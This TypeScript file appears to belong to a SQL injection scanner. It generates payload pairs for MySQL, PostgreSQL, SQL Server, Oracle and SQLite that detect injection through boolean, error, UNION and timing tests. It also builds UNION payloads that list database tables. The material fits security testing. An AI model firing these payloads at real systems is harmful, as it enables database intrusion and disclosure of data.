/**
 * UCMA-X — Production Dialect Compiler
 * Compiles high-level SemanticTestIntent structures into concrete SQL dialect AST/payloads.
 */

import { CandidateParameter, DbmsType, InjectionContext } from '../../../types/sqlScanner';
import { SemanticIntentType } from './SemanticTestIntent';

export interface CompiledPayloadPair {
  truePayload: string;
  falsePayload: string;
  expectedDiffChannel: 'content' | 'status' | 'timing' | 'error' | 'canary';
  canaryMarker?: string;
  metadata?: Record<string, any>;
}

export class DialectCompiler {
  /**
   * Compiles a SemanticIntent into concrete executable payload strings.
   */
  public static compile(
    intent: SemanticIntentType,
    context: InjectionContext,
    dbms: DbmsType,
    param: CandidateParameter,
    options?: {
      columnCount?: number;
      targetIndex?: number;
      delaySeconds?: number;
      quoteStyle?: 'balanced' | 'commented';
      tableName?: string;
      columnName?: string;
    }
  ): CompiledPayloadPair {
    const isNum = context === 'numeric' || /^\d+$/.test(param.originalValue.trim());
    const quoteStyle = options?.quoteStyle || 'balanced';

    switch (intent) {
      case 'ORDER_BOUNDARY_TEST': {
        const col = options?.targetIndex || 1;
        return {
          truePayload: `(CASE WHEN (1=1) THEN ${col} ELSE 1 END)`,
          falsePayload: `(CASE WHEN (1=2) THEN ${col} ELSE 1 END)`,
          expectedDiffChannel: 'content',
          metadata: { testedColumn: col },
        };
      }

      case 'ORDER_DIRECTION_TEST': {
        return {
          truePayload: `ASC`,
          falsePayload: `DESC`,
          expectedDiffChannel: 'content',
        };
      }

      case 'TRUE_FALSE_DIFFERENTIAL': {
        if (context === 'numeric' || isNum) {
          return {
            truePayload: ` AND 1337=1337`,
            falsePayload: ` AND 1337=1338`,
            expectedDiffChannel: 'content',
          };
        }
        if (context === 'double_quote_string') {
          return {
            truePayload: `" AND "1"="1`,
            falsePayload: `" AND "1"="2`,
            expectedDiffChannel: 'content',
          };
        }
        if (context === 'parenthesized_string') {
          return {
            truePayload: `') AND ('1'='1`,
            falsePayload: `') AND ('1'='2`,
            expectedDiffChannel: 'content',
          };
        }
        if (context === 'like_clause') {
          return {
            truePayload: `%' AND 1=1 AND '%'='`,
            falsePayload: `%' AND 1=2 AND '%'='`,
            expectedDiffChannel: 'content',
          };
        }
        // Default single_quote_string
        if (quoteStyle === 'commented') {
          const comment = dbms === 'Oracle' ? '--' : dbms === 'MySQL' ? '# ' : '-- ';
          return {
            truePayload: `' AND 1=1${comment}`,
            falsePayload: `' AND 1=2${comment}`,
            expectedDiffChannel: 'content',
          };
        }
        return {
          truePayload: `' AND '1'='1`,
          falsePayload: `' AND '1'='2`,
          expectedDiffChannel: 'content',
        };
      }

      case 'ERROR_BEHAVIOR_TEST': {
        if (dbms === 'PostgreSQL') {
          return {
            truePayload: `' AND 1=CAST((SELECT version()) AS int)-- `,
            falsePayload: `' AND 1=1-- `,
            expectedDiffChannel: 'error',
          };
        }
        if (dbms === 'Microsoft SQL Server') {
          return {
            truePayload: `' AND 1=CONVERT(int, (SELECT @@version))-- `,
            falsePayload: `' AND 1=1-- `,
            expectedDiffChannel: 'error',
          };
        }
        if (dbms === 'MySQL') {
          return {
            truePayload: `' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version)))# `,
            falsePayload: `' AND 1=1# `,
            expectedDiffChannel: 'error',
          };
        }
        // Generic SQL / Oracle error probe
        return {
          truePayload: `' AND (SELECT 1 FROM non_existent_canary_tbl_9999)=1-- `,
          falsePayload: `' AND 1=1-- `,
          expectedDiffChannel: 'error',
        };
      }

      case 'UNION_COMPATIBILITY_TEST': {
        const numCols = options?.columnCount || 3;
        const renderPos = options?.targetIndex || 1;
        const canary = `canary_${Math.random().toString(36).substring(2, 8)}`;
        const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";
        const parts = Array(numCols).fill('NULL');
        parts[renderPos - 1] = `'${canary}'`;
        const fromClause = dbms === 'Oracle' ? ' FROM DUAL--' : '-- ';

        return {
          truePayload: `${prefix}${parts.join(',')} ${fromClause}`,
          falsePayload: `${prefix}${Array(numCols).fill('NULL').join(',')} ${fromClause}`,
          expectedDiffChannel: 'canary',
          canaryMarker: canary,
          metadata: { columnCount: numCols, renderIndex: renderPos },
        };
      }

      case 'TIMING_BEHAVIOR_TEST': {
        const delay = options?.delaySeconds || 3;
        let sleepSql = '';
        if (dbms === 'PostgreSQL') {
          sleepSql = `(SELECT pg_sleep(${delay}))`;
        } else if (dbms === 'MySQL') {
          sleepSql = `SLEEP(${delay})`;
        } else if (dbms === 'Microsoft SQL Server') {
          sleepSql = `WAITFOR DELAY '0:0:${delay}'`;
        } else if (dbms === 'Oracle') {
          sleepSql = `DBMS_PIPE.RECEIVE_MESSAGE('a',${delay})`;
        } else {
          sleepSql = `(SELECT pg_sleep(${delay}))`;
        }

        const prefix = isNum ? '' : "'";
        const comment = dbms === 'Oracle' ? '--' : '-- ';
        return {
          truePayload: `${prefix} AND ${sleepSql}${comment}`,
          falsePayload: `${prefix} AND 1=1${comment}`,
          expectedDiffChannel: 'timing',
          metadata: { delaySeconds: delay },
        };
      }

      case 'METADATA_DISCOVERY_TEST': {
        const numCols = options?.columnCount || 2;
        const renderPos = options?.targetIndex || 1;
        const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";
        const parts = Array(numCols).fill('NULL');

        let colExpr = "CONCAT('<<TBL>>',table_name,'<</TBL>>')";
        let fromSql = "FROM information_schema.tables WHERE table_schema='public'-- ";

        if (dbms === 'Oracle') {
          colExpr = "'<<TBL>>'||table_name||'<</TBL>>'";
          fromSql = "FROM all_tables WHERE ROWNUM<=10--";
        } else if (dbms === 'Microsoft SQL Server') {
          colExpr = "'<<TBL>>'+name+'<</TBL>>'";
          fromSql = "FROM sys.tables-- ";
        } else if (dbms === 'SQLite') {
          colExpr = "'<<TBL>>'||name||'<</TBL>>'";
          fromSql = "FROM sqlite_master WHERE type='table'-- ";
        }

        parts[renderPos - 1] = colExpr;
        return {
          truePayload: `${prefix}${parts.join(',')} ${fromSql}`,
          falsePayload: '',
          expectedDiffChannel: 'content',
        };
      }

      default: {
        return {
          truePayload: `' AND 1=1-- `,
          falsePayload: `' AND 1=2-- `,
          expectedDiffChannel: 'content',
        };
      }
    }
  }
}
